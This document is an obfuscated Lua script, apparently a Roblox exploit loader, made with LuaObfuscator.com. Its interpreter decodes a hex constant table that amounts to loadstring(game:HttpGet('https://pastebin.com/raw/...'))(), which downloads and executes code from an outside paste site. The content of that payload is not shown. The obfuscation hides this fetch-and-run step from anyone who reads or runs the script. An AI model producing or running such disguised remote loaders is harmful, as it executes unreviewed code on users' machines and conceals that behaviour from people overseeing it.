--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v81=v2(v0(v30,16));if v19 then local v86=v5(v81,v19);v19=nil;return v86;else return v81;end end end);local function v20(v31,v32,v33) if v33 then local v82=(v31/(2^(v32-(2 -1))))%(((882 -(282 + 595)) -3)^(((v33-(1 -0)) -(v32-((1639 -(1523 + 114)) -(1 + 0)))) + (620 -(555 + 64)))) ;return v82-(v82%(932 -(857 + 74))) ;else local v83=((812 -242) -(367 + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v83 + v83))>=v83) and (1 + 0)) or ((1065 -(68 + 997)) + 0) ;end end local function v21() local v34=0;local v35;while true do if (v34==(1271 -(226 + 1044))) then return v35;end if (v34==(0 -(0 + 0))) then v35=v1(v16,v18,v18);v18=v18 + (118 -(32 + 85)) ;v34=1 + 0 ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + 2 );v18=v18 + (959 -(892 + 65)) ;return (v37 * (610 -354)) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + ((12 -7) -(2 + 0)) );v18=v18 + (7 -(11 -8)) ;return (v41 * (16777566 -(87 + 263))) + (v40 * (65716 -(67 + 113))) + (v39 * (188 + 68)) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=953 -(802 + 150) ;local v45=(v20(v43,2 -1 ,36 -(458 -(416 + 26)) ) * ((2 + 0)^32)) + v42 ;local v46=v20(v43,1018 -((1618 -703) + 82) ,87 -56 );local v47=((v20(v43,32)==(1 + 0)) and  -(1 -0)) or (439 -(145 + 293)) ;if (v46==(430 -(44 + 386))) then if (v45==(1187 -(1069 + 118))) then return v47 * (0 -0) ;else local v87=0 -0 ;while true do if (v87==((0 -0) + 0)) then v46=(1 + 0) -0 ;v44=0 + 0 ;break;end end end elseif (v46==(2838 -(368 + 423))) then return ((v45==0) and (v47 * ((3 -(1 + 1))/0))) or (v47 * NaN) ;end return v8(v47,v46-(1041 -(10 + 8)) ) * (v44 + (v45/((7 -5)^52))) ;end local function v25(v48) local v49=(0 -0) + 0 ;local v50;local v51;while true do if (v49==(862 -(814 + 45))) then return v6(v51);end if (v49==(772 -(201 + 571))) then v50=nil;if  not v48 then v48=v23();if (v48==((449 + 689) -(116 + 1022))) then return "";end end v49=4 -3 ;end if (v49==(1 + 1)) then v51={};for v88=886 -((898 -637) + 624) , #v50 do v51[v88]=v2(v1(v3(v50,v88,v88)));end v49=2 + 1 ;end if (v49==(3 -2)) then v50=v3(v16,v18,(v18 + v48) -(1424 -(630 + 793)) );v18=v18 + v48 ;v49=7 -5 ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 0 + 0 ;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();while true do local v66=(function() return 0;end)();while true do if (v66==(0 -0)) then local v90=(function() return 0;end)();while true do if (v90==(0 -0)) then if (v52==0) then v53=(function() return function(v106,v107,v108) local v109=(function() return 0;end)();local v110=(function() return;end)();while true do if (v109~=0) then else v110=(function() return 0;end)();while true do if (v110==0) then v106[v107-#"/" ]=(function() return v108();end)();return v106,v107,v108;end end break;end end end;end)();v54=(function() return {};end)();v55=(function() return {};end)();v56=(function() return {};end)();v52=(function() return 1;end)();end if (v52==(1701 -(1419 + 281))) then local v101=(function() return 0 -0 ;end)();while true do if (v101~=(74 -(71 + 3))) then else v57=(function() return {v54,v55,nil,v56};end)();v58=(function() return v23();end)();v101=(function() return 2 -1 ;end)();end if (v101==1) then local v145=(function() return 0 -0 ;end)();while true do if (1~=v145) then else v101=(function() return 2;end)();break;end if (0==v145) then v59=(function() return {};end)();for v163= #"|",v58 do local v164=(function() return 241 -(187 + 54) ;end)();local v165=(function() return;end)();local v166=(function() return;end)();while true do if (v164==(780 -(162 + 618))) then local v169=(function() return 0 + 0 ;end)();local v170=(function() return;end)();while true do if ((0 + 0)==v169) then v170=(function() return 0;end)();while true do if ((1 -0)~=v170) then else v164=(function() return 1 -0 ;end)();break;end if (v170==(0 + 0)) then local v174=(function() return 0;end)();while true do if (v174~=(1637 -(1373 + 263))) then else v170=(function() return 1001 -(451 + 549) ;end)();break;end if (v174~=0) then else v165=(function() return v21();end)();v166=(function() return nil;end)();v174=(function() return 1 + 0 ;end)();end end end end break;end end end if (v164==1) then if (v165== #"|") then v166=(function() return v21()~=0 ;end)();elseif (v165==2) then v166=(function() return v24();end)();elseif (v165== #"gha") then v166=(function() return v25();end)();end v59[v163]=(function() return v166;end)();break;end end end v145=(function() return 1 -0 ;end)();end end end if (2==v101) then v52=(function() return 2;end)();break;end end end v90=(function() return 1;end)();end if (v90==1) then v66=(function() return 1 -0 ;end)();break;end end end if ((1385 -(746 + 638))==v66) then if (2==v52) then v57[ #"xxx"]=(function() return v21();end)();for v98= #"|",v23() do local v99=(function() return v21();end)();if (v20(v99, #",", #"\\")==(0 + 0)) then local v102=(function() return 0 -0 ;end)();local v103=(function() return;end)();local v104=(function() return;end)();local v105=(function() return;end)();while true do if ((343 -(218 + 123))==v102) then if (v20(v104, #"<", #":")== #"]") then v105[2]=(function() return v59[v105[1583 -(1535 + 46) ]];end)();end if (v20(v104,2 + 0 ,1 + 1 )== #"[") then v105[ #"19("]=(function() return v59[v105[ #"19("]];end)();end v102=(function() return 3;end)();end if (v102~=3) then else if (v20(v104, #"xxx", #"nil")~= #"}") then else v105[ #"xnxx"]=(function() return v59[v105[ #".dev"]];end)();end v54[v98]=(function() return v105;end)();break;end if ((561 -(306 + 254))~=v102) then else local v147=(function() return 0;end)();local v148=(function() return;end)();while true do if (v147~=(0 + 0)) then else v148=(function() return 0;end)();while true do if ((1 -0)==v148) then v102=(function() return 2;end)();break;end if (v148==(1467 -(899 + 568))) then local v168=(function() return 0;end)();while true do if (v168==(1 + 0)) then v148=(function() return 2 -1 ;end)();break;end if (v168==(603 -(268 + 335))) then v105=(function() return {v22(),v22(),nil,nil};end)();if (v103==0) then local v172=(function() return 572 -(426 + 146) ;end)();local v173=(function() return;end)();while true do if (v172~=(0 + 0)) then else v173=(function() return 0;end)();while true do if (v173==0) then v105[ #"-19"]=(function() return v22();end)();v105[ #"http"]=(function() return v22();end)();break;end end break;end end elseif (v103== #"[") then v105[ #"xnx"]=(function() return v23();end)();elseif (v103==(1458 -(282 + 1174))) then v105[ #"-19"]=(function() return v23() -((813 -(569 + 242))^16) ;end)();elseif (v103~= #"xxx") then else local v179=(function() return 0 -0 ;end)();local v180=(function() return;end)();while true do if (v179==(0 + 0)) then v180=(function() return 0;end)();while true do if (v180~=0) then else v105[ #"gha"]=(function() return v23() -(2^16) ;end)();v105[ #"http"]=(function() return v22();end)();break;end end break;end end end v168=(function() return 1025 -(706 + 318) ;end)();end end end end break;end end end if (v102~=0) then else local v149=(function() return 1251 -(721 + 530) ;end)();local v150=(function() return;end)();while true do if (v149==(1271 -(945 + 326))) then v150=(function() return 0 -0 ;end)();while true do if (v150==1) then v102=(function() return 1 + 0 ;end)();break;end if ((700 -(271 + 429))==v150) then v103=(function() return v20(v99,2, #"-19");end)();v104=(function() return v20(v99, #"asd1",6 + 0 );end)();v150=(function() return 1501 -(1408 + 92) ;end)();end end break;end end end end end end for v100= #" ",v23() do v55,v100,v28=(function() return v53(v55,v100,v28);end)();end return v57;end break;end end end end local function v29(v60,v61,v62) local v63=v60[1087 -(461 + 625) ];local v64=v60[1 + 1 ];local v65=v60[7 -(6 -2) ];return function(...) local v67=v63;local v68=v64;local v69=v65;local v70=v27;local v71=1289 -(993 + 295) ;local v72= -(1 + (0 -0));local v73={};local v74={...};local v75=v12("#",...) -(406 -(91 + 27 + 287)) ;local v76={};local v77={};for v84=0 -(476 -(41 + 435)) ,v75 do if (v84>=v69) then v73[v84-v69 ]=v74[v84 + (1172 -(418 + 753)) ];else v77[v84]=v74[v84 + (2 -1) ];end end local v78=(v75-v69) + (1002 -(938 + 63)) + 0 ;local v79;local v80;while true do local v85=0 + 0 ;while true do if (v85==(0 + 0 + 0)) then v79=v67[v71];v80=v79[1 + 0 ];v85=530 -(406 + 123) ;end if (v85==(1770 -((2874 -(936 + 189)) + 20))) then if ((v80<=(1 + 2)) or (443>=4015)) then if (v80<=(1323 -(1249 + 73))) then if ((3382>166) and (v80>(0 + 0))) then local v111=v79[1 + 1 ];v77[v111]=v77[v111](v13(v77,v111 + (1146 -(466 + 679)) ,v72));else local v113;local v114,v115;local v116;local v117;v77[v79[4 -2 ]]={};v71=v71 + (2 -1) ;v79=v67[v71];v77[v79[1 + 1 ]]=v62[v79[8 -5 ]];v71=v71 + (1901 -(106 + 1794)) ;v79=v67[v71];v77[v79[1 + 1 ]]=v62[v79[1 + 2 ]];v71=v71 + (2 -1) ;v79=v67[v71];v117=v79[755 -(239 + 514) ];v116=v77[v79[7 -4 ]];v77[v117 + 1 + (1613 -(1565 + 48)) ]=v116;v77[v117]=v116[v79[118 -(4 + 68 + 42) ]];v71=v71 + (585 -(57 + 527)) ;v79=v67[v71];v77[v79[1429 -(41 + 1386) ]]=v79[106 -(17 + 86) ];v71=v71 + (1139 -(782 + 356)) + 0 ;v79=v67[v71];v117=v79[3 -1 ];v114,v115=v70(v77[v117](v13(v77,v117 + (2 -(268 -(176 + 91))) ,v79[8 -5 ])));v72=(v115 + v117) -(167 -((317 -195) + 44)) ;v113=0 -(0 -0) ;for v151=v117,v72 do v113=v113 + 1 + 0 ;v77[v151]=v114[v113];end v71=v71 + ((1095 -(975 + 117)) -2) ;v79=v67[v71];v117=v79[2];v77[v117]=v77[v117](v13(v77,v117 + 1 + 0 ,v72));v71=v71 + (1 -0) ;v79=v67[v71];v77[v79[1 + 1 ]]();v71=v71 + (1 -0) ;v79=v67[v71];do return;end end elseif ((v80==(67 -((1905 -(157 + 1718)) + 35))) or (280==3059)) then v77[v79[2 + 0 ]]={};else local v133=v79[(1022 + 237) -(1043 + 214) ];local v134=v77[v79[11 -(28 -20) ]];v77[v133 + (1213 -(323 + 889)) ]=v134;v77[v133]=v134[v79[10 -6 ]];end elseif ((1881>1293) and (v80<=(585 -(361 + 219)))) then if (v80>(324 -(53 + 267))) then local v138=0 + (0 -0) ;local v139;local v140;local v141;local v142;while true do if (1==v138) then v72=(v141 + v139) -(414 -(15 + 398)) ;v142=982 -(18 + 964) ;v138=7 -(1023 -(697 + 321)) ;end if (v138==(2 + 0)) then for v160=v139,v72 do v142=v142 + 1 ;v77[v160]=v140[v142];end break;end if (v138==0) then v139=v79[2 + 0 ];v140,v141=v70(v77[v139](v13(v77,v139 + (2 -1) + 0 ,v79[2 + 1 ])));v138=851 -(20 + 830) ;end end else v77[v79[2 + (0 -0) ]]();end elseif (v80<=(132 -(116 + (23 -13)))) then v77[v79[2]]=v62[v79[3]];elseif ((2357==2357) and (v80>(1 + 6))) then v77[v79[740 -(542 + 196) ]]=v79[6 -3 ];else do return;end end v71=v71 + 1 + 0 ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F584B43633374667800099Q003Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000200046Q00013Q00024Q0001000100016Q00017Q00",v9(),...);
